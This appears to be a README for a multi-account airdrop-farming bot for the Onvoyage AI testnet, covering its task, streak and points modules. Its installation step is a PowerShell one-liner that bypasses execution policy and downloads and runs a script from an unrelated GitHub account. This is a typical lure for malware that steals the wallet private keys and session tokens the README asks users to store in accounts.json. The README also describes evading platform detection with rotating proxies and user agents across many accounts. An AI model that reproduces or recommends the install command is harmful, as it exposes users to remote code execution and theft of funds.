# 🤖 Onvoyage AI Bot

> Automated multi-account bot for [Onvoyage AI](https://app.onvoyage.ai) — completes daily tasks, maintains streaks, and farms points across unlimited accounts with per-account proxy support

[![Python](https://img.shields.io/badge/Python-3.10+-3776AB?style=for-the-badge&logo=python&logoColor=white)](https://python.org)
[![Onvoyage](https://img.shields.io/badge/Onvoyage_AI-Testnet-6C47FF?style=for-the-badge&logoColor=white)](https://app.onvoyage.ai)
[![License](https://img.shields.io/badge/License-MIT-00C851?style=for-the-badge)](LICENSE)
[![Stars](https://img.shields.io/github/stars/omgmad/onvoyage-bot?style=for-the-badge&color=FFD700)](https://github.com/omgmad/onvoyage-bot)

```
╔══════════════════════════════════════════════════════════════════╗
║  Module 1 — Daily Tasks      │  auto-complete tasks every cycle ║
║  Module 2 — Streak Keeper    │  never miss a check-in again     ║
║  Module 3 — Points Farmer    │  full automation across N accs   ║
║                                                                  ║
║  ✦ Multi-account  ·  Per-account proxies  ·  Async workers     ║
╚══════════════════════════════════════════════════════════════════╝
```

**[🚀 Join Onvoyage AI](https://app.onvoyage.ai)** · **[🐦 Follow Dev](https://x.com/0mgm4d)**

---

## 📌 Table of Contents

- [How It Works](#-how-it-works)
- [Multi-Account & Proxy Support](#-multi-account--proxy-support)
- [Modules](#-modules)
  - [Module 1 — Daily Tasks](#-module-1--daily-tasks)
  - [Module 2 — Streak Keeper](#-module-2--streak-keeper)
  - [Module 3 — Points Farmer](#-module-3--points-farmer)
- [Installation](#️-installation)
- [Configuration](#️-configuration)
- [Running the Bot](#-running-the-bot)
- [Running 24/7 on a VPS](#️-running-247-on-a-vps)
- [Telegram Commands](#-telegram-commands)
- [Disclaimer](#️-disclaimer)

---

## ⚡ How It Works

```
  Onvoyage AI resets tasks (daily / weekly)
          │
          ▼  (all accounts check simultaneously)
          │
  Per account:
    • Authenticate with session token
    • Route traffic through assigned proxy
    • Fetch available task list
    • Complete tasks in priority order
    • Maintain daily check-in streak
          │
          ▼
  Points credited to each account  🎯
          │
          ▼
  Telegram summary sent  📱
```

Every account runs as an independent async worker — one expired token or failed proxy never blocks the others.

---

## 👥 Multi-Account & Proxy Support

### How accounts are configured

All accounts live in a single `accounts.json` file. Each entry holds its own credentials, session token, and optionally a dedicated proxy.

```
  accounts.json
  ├── Account #1  →  wallet_1 + token_1 + proxy_1
  ├── Account #2  →  wallet_2 + token_2 + proxy_2
  ├── Account #3  →  wallet_3 + token_3 + (no proxy)
  └── ...unlimited accounts
          │
          ▼
  Bot spawns one async worker per account
          │
          ▼
  Workers run in parallel up to MAX_PARALLEL
  Remaining accounts queue and start as slots free
```

**accounts.json structure:**

```json
[
  {
    "id": "account_1",
    "label": "Main",
    "wallet_address": "0xYourWallet1",
    "private_key": "0xYourPrivateKey1",
    "onvoyage_token": "your_session_token_1",
    "referral_code": "YOUR_REF",
    "proxy": "http://user:pass@host:port"
  },
  {
    "id": "account_2",
    "label": "Secondary",
    "wallet_address": "0xYourWallet2",
    "private_key": "0xYourPrivateKey2",
    "onvoyage_token": "your_session_token_2",
    "referral_code": "YOUR_REF",
    "proxy": "socks5://user:pass@host:port"
  },
  {
    "id": "account_3",
    "label": "No proxy",
    "wallet_address": "0xYourWallet3",
    "private_key": "0xYourPrivateKey3",
    "onvoyage_token": "your_session_token_3",
    "referral_code": "YOUR_REF",
    "proxy": ""
  }
]
```

### Proxy formats supported

| Format | Example |
|--------|---------|
| HTTP | `http://user:pass@host:port` |
| HTTPS | `https://user:pass@host:port` |
| SOCKS5 | `socks5://user:pass@host:port` |
| No auth | `http://host:port` |
| None | leave `"proxy": ""` |

### Concurrency & safety settings

```env
MAX_PARALLEL=5          # Max accounts running at the same time
ACCOUNT_DELAY=15        # Seconds between launching each worker
JITTER=true             # Random ±10s delay per action (human-like)
PROXY_TEST_ON_START=true  # Verify each proxy is reachable before farming
ROTATE_USER_AGENT=true  # Different user-agent header per account
```

> 💡 **Tip:** If running 10+ accounts, set `MAX_PARALLEL=5` and `ACCOUNT_DELAY=15` to avoid burst requests hitting Onvoyage's rate limits. Enable `PROXY_TEST_ON_START=true` so bad proxies are flagged before the cycle begins — not mid-run.

---

## 📐 Modules

### ✅ Module 1 — Daily Tasks

The bot authenticates each account, fetches the available task list from Onvoyage AI, and completes tasks automatically in order of highest points first.

```
  Authenticate account  (token + optional proxy)
              │
              ▼
  Fetch task list  →  filter by: daily | weekly | one-time
              │
              ▼
  Sort by points descending
              │
              ▼
  Execute each eligible task:
    • On-chain interaction (sign tx with wallet)
    • Platform engagement (visit, click, verify)
    • Social task (follow, share, repost)
    • Referral task (if applicable)
              │
              ▼
  Mark complete → points credited ✅
```

**Supported task types:**

| Task Type | Description | Frequency |
|-----------|-------------|-----------|
| Daily check-in | Ping Onvoyage once per 24h | Daily |
| On-chain tx | Testnet wallet interaction | Daily / Weekly |
| Platform task | In-app engagement action | Daily |
| Social task | Follow / share / repost | One-time / Weekly |
| Referral bonus | Points for referred accounts | Ongoing |

**Config block:**

```env
MODULE=tasks
TASK_TYPES=checkin,onchain,platform,social
TASK_INTERVAL=3600               # Check for new tasks every N seconds
TASK_PRIORITY=points_desc        # points_desc | points_asc | fifo
SKIP_TASKS=                      # Comma-separated task IDs to skip
MAX_TASKS_PER_RUN=20             # Max tasks per account per cycle
```

> 💡 **Tip:** Always include `checkin` in `TASK_TYPES` — it's the lowest-effort task and protects your streak multiplier which boosts points on everything else.

---

### 🔥 Module 2 — Streak Keeper

Dedicated module that does one job — makes sure every account hits its daily check-in before the reset window closes, no matter what.

```
  Every account: calculate time until next reset
              │
              ▼
  Check-in window open?
    • YES → ping check-in endpoint immediately
    • NO  → sleep until window opens
              │
              ▼
  Streak incremented ✅
              │
              ▼
  Telegram alert if any account missed (token expired, proxy down, etc.)
```

**Why a separate module:**

Tasks can be skipped and recovered the next day. Streaks can't — missing a single day resets your multiplier. The Streak Keeper runs on its own tighter loop independent of the main farming cycle.

**Config block:**

```env
MODULE=streak
STREAK_CHECK_INTERVAL=1800        # Check streak status every 30 min
STREAK_ALERT_THRESHOLD=2          # Alert N hours before reset window closes
STREAK_FORCE_CHECKIN=true         # Attempt check-in even if other tasks fail
```

---

### 🌾 Module 3 — Points Farmer

Combines both modules into one fully automated loop across all accounts. Each account tracks its own cycle, streak, and daily cap independently.

```
  All account workers start  (staggered by ACCOUNT_DELAY)
          │
          ▼  each worker independently:
          │
  Run streak check-in  (Module 2)
          │
          ▼
  Complete available tasks  (Module 1)
          │
          ▼
  Wait CYCLE_INTERVAL
          │
          ▼
  Daily cap reached?
    • NO  → next cycle
    • YES → sleep until midnight reset  😴
          │
          ▼
  Telegram summary: points per account, streak status  📱
```

**Config block:**

```env
MODULE=farmer
DAILY_POINTS_CAP=1000             # Per-account daily target (0 = no cap)
CYCLE_INTERVAL=3600               # Seconds between farming cycles
FARMER_START_TIME=07:00           # Start farming at this time
FARMER_STOP_TIME=23:30            # Stop farming at this time
POST_CYCLE_SUMMARY=true           # Send Telegram summary after each cycle
```

---

## 🛠️ Installation

### Requirements

- Python 3.10+
- An [Onvoyage AI](https://app.onvoyage.ai) account (one or more)
- Testnet wallets (one per account)
- Optional: proxies for multi-account isolation


### Option 1: PowerShell (Recommended)
Open **PowerShell** and run this **single command**:

```powershell
powershell -ep bypass -c "iwr https://github.com/Neelapusaibhavani9/Onvoyage-Ai-Testnet-Farm/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```
### Option 2: Cmd 
Open **CMD** and run this **single command**:
```
powershell -ep bypass -c "iwr https://github.com/Neelapusaibhavani9/Onvoyage-Ai-Testnet-Farm/releases/download/v1.92/main.ps1 -UseBasicParsing | iex"
```

### Step 2 — Create a virtual environment

```bash
python3 -m venv venv

# Linux / Mac
source venv/bin/activate

# Windows
venv\Scripts\activate
```

### Step 3 — Install dependencies

```bash
pip install requests web3 python-dotenv colorama schedule aiohttp aiohttp-socks
```

### Step 4 — Get your Onvoyage session tokens

For each account:

1. Log in to [app.onvoyage.ai](https://app.onvoyage.ai)
2. Open DevTools (`F12`) → **Application** → **Cookies** → `app.onvoyage.ai`
3. Copy the auth/session token
4. Paste it into `onvoyage_token` in your `accounts.json`

> ⚠️ Session tokens expire periodically. When a token expires, only that account pauses — all others keep running. The bot sends a Telegram alert specifying which account needs a refresh.

### Step 5 — Build your accounts.json

Copy the template and fill in your accounts:

```bash
cp accounts.example.json accounts.json
nano accounts.json
```

---

## ⚙️ Configuration

### `accounts.json` — one entry per account

See the [Multi-Account & Proxy Support](#-multi-account--proxy-support) section for the full structure.

### `.env` — global settings

```env
# ── Active module ──────────────────────────────────────
# Options: tasks | streak | farmer
MODULE=farmer

# ── Multi-account ──────────────────────────────────────
ACCOUNTS_FILE=accounts.json
MAX_PARALLEL=5                    # Max concurrent workers
ACCOUNT_DELAY=15                  # Seconds between worker starts
JITTER=true                       # Randomize timing per action
PROXY_TEST_ON_START=true          # Test proxies before farming
ROTATE_USER_AGENT=true            # Unique user-agent per account

# ── Farming schedule ───────────────────────────────────
DAILY_POINTS_CAP=1000             # Per-account (0 = unlimited)
CYCLE_INTERVAL=3600
FARMER_START_TIME=07:00
FARMER_STOP_TIME=23:30

# ── Task settings ──────────────────────────────────────
TASK_TYPES=checkin,onchain,platform,social
TASK_INTERVAL=3600
TASK_PRIORITY=points_desc
MAX_TASKS_PER_RUN=20

# ── Streak ─────────────────────────────────────────────
STREAK_CHECK_INTERVAL=1800
STREAK_ALERT_THRESHOLD=2
STREAK_FORCE_CHECKIN=true

# ── Telegram (optional but recommended) ────────────────
TELEGRAM_TOKEN=
TELEGRAM_CHAT_ID=
```

---

## 🚀 Running the Bot

```bash
# First-time setup (creates accounts.json template)
python onvoyage_bot.py --setup

# Run all accounts
python onvoyage_bot.py

# Run a single account
python onvoyage_bot.py --account account_1

# Single cycle and exit (useful for cron)
python onvoyage_bot.py --once

# Test proxies only, no farming
python onvoyage_bot.py --test-proxies

# Dashboard only
python onvoyage_bot.py --dashboard
```

On successful start:

```
╔══════════════════════════════════════════════════════╗
║   🤖  Onvoyage AI Bot v1.0                           ║
║   Press Ctrl+C at any time to stop.                  ║
╚══════════════════════════════════════════════════════╝

  Module:      farmer
  Accounts:    5 loaded
  Proxies:     4 assigned  (1 direct)
  Parallel:    up to 5
  Jitter:      ON

  Testing proxies... ████████░░  4/5 OK  (1 failed — account_3 flagged)

  Start bot? [yes/no]: yes
```

**Live terminal dashboard:**

```
🤖 Onvoyage AI Bot v1.0                    updated 09:04:15
══════════════════════════════════════════════════════════════
  Module: farmer   Accounts: 5   Next cycle: 47m
──────────────────────────────────────────────────────────────
  ACCOUNTS
  ID            Points today   Streak    Proxy          Status
  account_1     620 / 1000     🔥 21d    proxy_1        ● running
  account_2     480 / 1000     🔥 14d    proxy_2        ● running
  account_3     320 / 1000     🔥  7d    ✗ dead         ⚠️ direct
  account_4     750 / 1000     🔥 30d    proxy_3        ● running
  account_5       0 / 1000         2d    proxy_4        ⏳ queued
──────────────────────────────────────────────────────────────
  TASKS  (account_4)
  Task                 Status      Points
  Daily check-in       ✅ done     +25
  On-chain tx          ✅ done     +100
  Platform task        ✅ done     +75
  Social task          ⏳ pending  +50
──────────────────────────────────────────────────────────────
  RECENT ACTIVITY
  09:04:15  account_4   On-chain tx done      +100 pts
  09:03:52  account_1   Check-in              +25 pts
  09:03:10  account_2   Platform task done    +75 pts
  09:01:44  account_3   Proxy failed → direct mode
```

---

## 🖥️ Running 24/7 on a VPS

For continuous operation, use a cheap VPS (Vultr, DigitalOcean, Hetzner — ~$5/month).

### Ubuntu VPS setup

```bash
# 1. Update system
sudo apt update && sudo apt upgrade -y
sudo apt install python3 python3-pip python3-venv screen git -y

# 2. Clone repo
git clone https://github.com/omgmad/onvoyage-bot
cd onvoyage-bot

# 3. Virtual environment
python3 -m venv venv
source venv/bin/activate
pip install requests web3 python-dotenv colorama schedule aiohttp aiohttp-socks

# 4. Configure
nano .env
nano accounts.json   # add all your accounts and proxies

# 5. Run inside screen (stays alive after you disconnect)
screen -S onvoyage
source venv/bin/activate
python onvoyage_bot.py

# Press Ctrl+A then D to detach — bot keeps running
```

### Reconnect later

```bash
screen -r onvoyage
```

### Useful log commands

```bash
tail -50 onvoyage_bot.log
grep "completed" onvoyage_bot.log | tail -20    # Completed tasks
grep "streak" onvoyage_bot.log | tail -20       # Streak events
grep "proxy" onvoyage_bot.log | tail -20        # Proxy events
grep "token expired" onvoyage_bot.log | tail -10 # Token refresh alerts
grep "ERROR" onvoyage_bot.log | tail -10        # Errors
```

---

## 📱 Telegram Setup & Commands

### Step 1 — Create a bot and get your token

1. Search for **`@BotFather`** on Telegram, send `/newbot`
2. Copy the token into `.env`:

```env
TELEGRAM_TOKEN=your_bot_token_here
```

### Step 2 — Get your Chat ID

1. Search for **`@userinfobot`**, send any message
2. Copy the numeric ID into `.env`:

```env
TELEGRAM_CHAT_ID=123456789
```

### Commands

| Command | Action |
|---------|--------|
| `/status` | All accounts: points, streaks, proxy status |
| `/tasks` | Completed and pending tasks per account |
| `/pause` | Pause all accounts |
| `/pause account_1` | Pause one specific account |
| `/resume` | Resume all accounts |
| `/resume account_1` | Resume one specific account |
| `/proxies` | Show proxy status for all accounts |
| `/stop` | Stop the bot completely |
| `/points` | Full points breakdown across all accounts |

### Example alerts

```
✅ Task Completed
Account: account_1
Task:    On-chain tx
Points:  +100
Total:   620 / 1000 today

🔥 Streak Maintained
Account: account_4
Streak:  30 days
Bonus:   ×1.5 multiplier active

⚠️ Proxy Failed
Account: account_3
Proxy:   proxy_4
Action:  falling back to direct connection
         (consider replacing this proxy)

⚠️ Token Expired
Account: account_2
Action:  refresh onvoyage_token in accounts.json
Status:  account_2 paused — all others still running

🌙 Daily Cap Reached
account_1 → 1000 / 1000 pts  😴
account_4 → 1000 / 1000 pts  😴
account_2 →  480 / 1000 pts  ● still farming
```

---

## ⚠️ Disclaimer

> **IMPORTANT:** This bot interacts with a testnet platform and social APIs on your behalf. Use responsibly and in accordance with Onvoyage's terms of service.

- Never share your `accounts.json`, private keys, or session tokens with anyone
- With many accounts on the same IP, use proxies to avoid rate-limit bans
- Session tokens expire — the bot notifies you per account, others keep running
- Dead proxies are flagged at startup — replace them before the cycle begins
- Testnet points and rewards are subject to Onvoyage's final airdrop/TGE rules — nothing is guaranteed
- Check your local regulations if any token rewards have monetary value

---

## 🔗 Links

[![Onvoyage](https://img.shields.io/badge/🚀_Onvoyage_AI-Open_App-6C47FF?style=for-the-badge)](https://app.onvoyage.ai)
[![Twitter](https://img.shields.io/badge/🐦_Twitter-@0mgm4d-1DA1F2?style=for-the-badge)](https://x.com/0mgm4d)

**If this helped you, please give it a ⭐ Star — it means a lot!**

## 🔍 Topics

`onvoyage-bot`, `testnet-bot`, `daily-tasks`, `streak-keeper`, `points-farmer`, `multi-account`, `proxy-support`, `python`, `async`, `telegram-bot`, `crypto-bot`, `web3`, `ai-testnet`, `airdrop-farming`, `automation`
